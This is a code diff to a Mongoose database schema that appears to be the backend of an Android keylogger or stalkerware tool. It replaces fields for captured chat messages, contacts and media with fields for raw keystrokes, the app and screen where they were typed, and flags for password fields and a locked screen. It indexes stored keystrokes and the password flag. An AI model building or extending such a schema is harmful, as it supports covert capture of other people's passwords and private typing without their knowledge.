@@ -24,88 +24,50 @@ const textInputSchema = new mongoose.Schema({
         type: String,
         required: true
     },
-    messageId: {
-        type: String,
-        default: ''
-    },
     
-    // ESSENTIAL MESSAGE CONTENT
-    text: {
+    // KEYBOARD INPUT DATA (PRIMARY FOCUS)
+    keyboardInput: {
         type: String,
         required: true
     },
-    completeMessage: {
+    inputField: {
         type: String,
         default: ''
     },
-    eventType: {
-        type: String,
-        required: true
-    },
-    
-    // CONTACT & CONVERSATION INFORMATION
-    contactName: {
-        type: String,
-        default: ''
-    },
-    contactNumber: {
-        type: String,
-        default: ''
-    },
-    chatTitle: {
-        type: String,
-        default: ''
-    },
-    conversationName: {
-        type: String,
-        default: ''
-    },
-    recipientInfo: {
-        type: String,
-        default: ''
-    },
-    isGroupChat: {
-        type: Boolean,
-        default: false
-    },
-    participantCount: {
-        type: Number,
-        default: 0
-    },
-    
-    // MEDIA INFORMATION
-    hasMedia: {
-        type: Boolean,
-        default: false
-    },
-    mediaType: {
-        type: String,
-        default: ''
-    },
-    mediaFileName: {
-        type: String,
-        default: ''
-    },
-    mediaUploaded: {
-        type: Boolean,
-        default: false
-    },
-    mediaDownloadUrl: {
+    inputType: {
         type: String,
         default: ''
     },
     
-    // BASIC UI INFO (minimal)
+    // CONTEXT INFORMATION (MINIMAL)
+    screenTitle: {
+        type: String,
+        default: ''
+    },
+    fieldHint: {
+        type: String,
+        default: ''
+    },
     isPassword: {
         type: Boolean,
         default: false
     },
-    isEditable: {
+    isScreenLocked: {
         type: Boolean,
         default: false
     },
     
-    // DEVICE INFO (minimal)
+    // APP CONTEXT (MINIMAL)
+    activityName: {
+        type: String,
+        default: ''
+    },
+    viewId: {
+        type: String,
+        default: ''
+    },
+    
+    // DEVICE INFO (MINIMAL)
     deviceModel: {
         type: String,
         default: ''
@@ -113,12 +75,6 @@ const textInputSchema = new mongoose.Schema({
     androidVersion: {
         type: String,
         default: ''
-    },
-    
-    // CUSTOM METADATA (for additional info)
-    customMetadata: {
-        type: mongoose.Schema.Types.Mixed,
-        default: null
     }
 }, { timestamps: true });
 
@@ -126,31 +82,25 @@ const textInputSchema = new mongoose.Schema({
 textInputSchema.index({ id: 1, deviceId: 1 }, { unique: true });
 textInputSchema.index({ packageName: 1, timestamp: 1 });
 textInputSchema.index({ deviceId: 1, timestamp: 1 });
-textInputSchema.index({ contactName: 1 });
-textInputSchema.index({ contactNumber: 1 });
-textInputSchema.index({ chatTitle: 1 });
+textInputSchema.index({ keyboardInput: 1 });
+textInputSchema.index({ inputField: 1 });
+textInputSchema.index({ isPassword: 1 });
 
 // Pre-save middleware to ensure data integrity
 textInputSchema.pre('save', function(next) {
-    // Ensure messageId is set if not provided
-    if (!this.messageId) {
-        this.messageId = `${this.packageName}:${Date.now()}`;
+    // Ensure keyboardInput is not empty
+    if (!this.keyboardInput || this.keyboardInput.trim() === '') {
+        return next(new Error('keyboardInput is required and cannot be empty'));
     }
     
-    // Ensure completeMessage is built if not provided
-    if (!this.completeMessage && this.text) {
-        const parts = [`App: ${this.appName}`];
-        
-        if (this.contactName || this.contactNumber || this.chatTitle) {
-            const recipientParts = [];
-            if (this.contactName) recipientParts.push(this.contactName);
-            if (this.contactNumber) recipientParts.push(this.contactNumber);
-            if (this.chatTitle) recipientParts.push(this.chatTitle);
-            parts.push(`To: ${recipientParts.join(', ')}`);
-        }
-        
-        parts.push(`Message: ${this.text}`);
-        this.completeMessage = parts.join(' | ');
+    // Ensure inputField has a default value if not provided
+    if (!this.inputField) {
+        this.inputField = 'text_input';
+    }
+    
+    // Ensure inputType has a default value if not provided
+    if (!this.inputType) {
+        this.inputType = 'text';
     }
     
     next();
